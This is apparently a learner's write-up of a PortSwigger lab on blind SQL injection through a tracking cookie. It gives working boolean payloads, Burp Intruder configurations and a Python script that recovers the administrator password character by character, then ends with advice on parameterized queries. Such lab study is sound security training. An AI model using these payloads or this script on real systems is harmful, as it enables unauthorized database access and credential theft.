# Blind SQL Injection with Conditional Responses

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection (Blind)  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Exploit a blind SQL injection vulnerability to extract the administrator password character by character using conditional responses.

---

## Vulnerability

The application uses a tracking cookie that is vulnerable to SQL injection. Unlike previous labs where query results are displayed on the page, this is a **blind SQL injection** — the application only reveals TRUE/FALSE through the presence or absence of a "Welcome back" message.

**Backend Query:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'USER_COOKIE_VALUE'
```

**Developer Mistake:**  
- **Cookie value not sanitized** — TrackingId directly concatenated into SQL
- **Conditional response leaks information** — "Welcome back" reveals query success
- **No prepared statements** on tracking functionality
- **Blind but exploitable** — boolean logic enables data extraction

**The Key Difference:** In blind SQLi, you cannot see data directly. You must ask TRUE/FALSE questions and infer answers from application behavior.

---

## Understanding Blind SQL Injection

### Normal SQLi vs Blind SQLi:

| Normal SQLi | Blind SQLi |
|-------------|-----------|
| Ask question → See answer | Ask question → YES or NO only |
| Results displayed on page | Behavior change indicates TRUE/FALSE |
| Direct data extraction | Infer data one bit at a time |

### The Oracle Mechanism:

In this lab, the "oracle" is the **"Welcome back" message**:
- Query returns data → "Welcome back" appears ✅ (TRUE)
- Query returns nothing → No message ❌ (FALSE)

This single bit of information is your entire attack surface.

---

## My Attack Methodology

### 🔵 Step 1: Confirm True/False Behavior

**Location:** TrackingId cookie (not URL parameter)

**TRUE test payload:**
```sql
' AND '1'='1
```

**Cookie:**
```
Cookie: TrackingId=CLkfAUfiXEgGQYpO' AND '1'='1; session=...
```

**Resulting SQL:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CLkfAUfiXEgGQYpO' AND '1'='1'
```

**Result:** ✅ "Welcome back" appears (1=1 is always TRUE)

---

**FALSE test payload:**
```sql
' AND '1'='2
```

**Cookie:**
```
Cookie: TrackingId=CLkfAUfiXEgGQYpO' AND '1'='2; session=...
```

**Resulting SQL:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CLkfAUfiXEgGQYpO' AND '1'='2'
```

**Result:** ❌ "Welcome back" disappears (1=2 is always FALSE)

**Conclusion:** TRUE/FALSE oracle confirmed! I can now ask boolean questions.

---

### 🔵 Step 2: Confirm `users` Table Exists

**Payload:**
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Cookie:**
```
Cookie: TrackingId=CLkfAUfiXEgGQYpO' AND (SELECT 'a' FROM users LIMIT 1)='a; session=...
```

**Resulting SQL:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CLkfAUfiXEgGQYpO' 
AND (SELECT 'a' FROM users LIMIT 1)='a'
```

**Result:** ✅ "Welcome back" appears

**Conclusion:** `users` table exists!

---

### 🔵 Step 3: Confirm `administrator` User Exists

**Payload:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Cookie:**
```
Cookie: TrackingId=CLkfAUfiXEgGQYpO' AND (SELECT 'a' FROM users WHERE username='administrator')='a; session=...
```

**Resulting SQL:**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'CLkfAUfiXEgGQYpO' 
AND (SELECT 'a' FROM users WHERE username='administrator')='a'
```

**Result:** ✅ "Welcome back" appears

**Conclusion:** `administrator` account confirmed!

---

### 🔵 Step 4: Find Password Length

**Testing payloads (binary search):**

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
✅ TRUE (password > 1 char)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
```
✅ TRUE (password > 10 chars)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>15)='a
```
✅ TRUE (password > 15 chars)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```
✅ TRUE (password > 20 chars)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>21)='a
```
❌ FALSE (password NOT > 21 chars)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```
✅ TRUE

**Conclusion:** Password is exactly **20 characters** long!

---

### 🔵 Step 5: Extract Password Character by Character

**Base payload for character extraction:**
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

**How SUBSTRING works:**
```sql
SUBSTRING(string, position, length)

SUBSTRING('hello', 1, 1) → 'h'  (1st character)
SUBSTRING('hello', 2, 1) → 'e'  (2nd character)
SUBSTRING('hello', 3, 1) → 'l'  (3rd character)
```

---

**Using Burp Suite Intruder - Cluster Bomb Attack:**

**Attack Configuration:**
- **Attack type:** Cluster Bomb (tests all combinations)
- **Payload position 1:** Character position (1-20)
- **Payload position 2:** Character to test (a-z, 0-9)

**Burp Intruder payload:**
```
TrackingId=CLkfAUfiXEgGQYpO' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

**Payload Set 1 (positions):**
```
1
2
3
...
20
```

**Payload Set 2 (characters):**
```
a b c d e f g h i j k l m n o p q r s t u v w x y z
0 1 2 3 4 5 6 7 8 9
```

**Grep Match:**
- Added "Welcome back" to identify TRUE responses
- Look for responses with ✓ checkmark

**Total requests:** 20 positions × 36 characters = 720 requests

**Time taken:** ~2 hours (due to Burp Community Edition rate limiting)

---

**Extracted Password:**

```
5eiksg3j8agocwibmex9
```

---

### 🔵 Step 6: Log In as Administrator

**Credentials:**
- Username: `administrator`
- Password: `5eiksg3j8agocwibmex9`

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: Confirm TRUE/FALSE oracle
        ' AND '1'='1  →  ✅ Welcome back
        ' AND '1'='2  →  ❌ No message
        ↓
Step 2: Confirm users table exists
        (SELECT 'a' FROM users LIMIT 1)='a  →  ✅
        ↓
Step 3: Confirm administrator exists
        WHERE username='administrator'  →  ✅
        ↓
Step 4: Find password length
        LENGTH(password)=20  →  ✅ (20 chars)
        ↓
Step 5: Extract char-by-char (Burp Cluster Bomb)
        SUBSTRING(password,1,1)='5'  →  ✅
        SUBSTRING(password,2,1)='e'  →  ✅
        ... (720 requests total)
        ↓
        Password: 5eiksg3j8agocwibmex9
        ↓
Step 6: Authenticate
        🎯 Lab solved!
```

---

## Optimized Attack Methods

### Method Comparison:

| Method | Speed | Difficulty | Requests | Best For |
|--------|-------|------------|----------|----------|
| **Cluster Bomb** (what I used) | Slow (2 hours) | Easy | 720 | Learning/manual |
| **Sniper** (one at a time) | Medium (30-60 min) | Easy | 720 (batched) | Manual extraction |
| **Python Script** | Fast (<30 sec) | Medium | ~200 | Real pentesting |

---

### Optimized: Sniper Attack (Recommended for Manual)

**Step-by-step for each character position:**

1. **Set attack type:** Sniper
2. **Payload position:** Only mark the character
   ```
   SUBSTRING(password,1,1)='§a§'
   ```
3. **Payloads:** a-z, 0-9 (36 values)
4. **Grep Match:** "Welcome back"
5. **Run attack:** Find the ✓ response → that's the character
6. **Change position:** `SUBSTRING(password,2,1)` and repeat

**Workflow:**
```
Position 1: Run Sniper → Find '5' → Next
Position 2: Run Sniper → Find 'e' → Next
Position 3: Run Sniper → Find 'i' → Next
...
Position 20: Run Sniper → Find '9' → Done!
```

**Advantages:**
- Cleaner organization (20 separate attacks)
- Easier to track progress
- Can stop/resume anytime
- Results are immediately clear

---

### Fastest: Python Script (Advanced)

```python
import requests

# Configuration
url = "https://YOUR-LAB-ID.web-security-academy.net/"
session_cookie = "YOUR_SESSION_VALUE"
tracking_id = "YOUR_TRACKING_ID"

# Character set to test
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

# Extract each character
for position in range(1, 21):  # 20 character password
    for char in charset:
        # Build injection payload
        injection = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        
        cookies = {
            "TrackingId": injection,
            "session": session_cookie
        }
        
        # Send request
        response = requests.get(url, cookies=cookies)
        
        # Check for TRUE response
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char}  →  {password}")
            break

print(f"\nFull password: {password}")
```

**Runtime:** ~30 seconds (with optimization, can be 10-15 seconds)

---

## What I Learned

1. **Blind SQLi requires patience** — 2 hours of manual extraction is real dedication
2. **Reconnaissance is crucial** — confirm table, user, and length before extraction
3. **Boolean logic is powerful** — one bit of information (TRUE/FALSE) is enough
4. **SUBSTRING enables character extraction** — break passwords into testable chunks
5. **Automation is the future** — scripts reduce 2 hours to 30 seconds

---

## Real-World Impact

Blind SQL injection is **extremely common** in production applications because:
- Developers focus on hiding data, not fixing the injection
- Error messages are disabled (seems secure, but still vulnerable)
- Authentication systems often have blind injection points
- Tracking/analytics cookies are rarely sanitized

**Real attacks using blind SQLi:**
- **Database enumeration** — map tables, columns, users
- **Credential theft** — extract usernames and passwords
- **Data exfiltration** — steal sensitive business data
- **Authentication bypass** — discover valid usernames for brute force

---

## Mitigation

**For Developers:**
- Use **parameterized queries** — prevents all SQL injection (blind or not)
- **Never concatenate user input** into SQL — including cookies!
- **Limit database permissions** — tracking queries shouldn't access users table
- Use **secure session management** — don't rely on SQL queries for tracking

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{tracking_cookie}'"

# ✅ Secure
query = "SELECT TrackingId FROM TrackedUsers WHERE TrackingId = ?"
cursor.execute(query, (tracking_cookie,))
```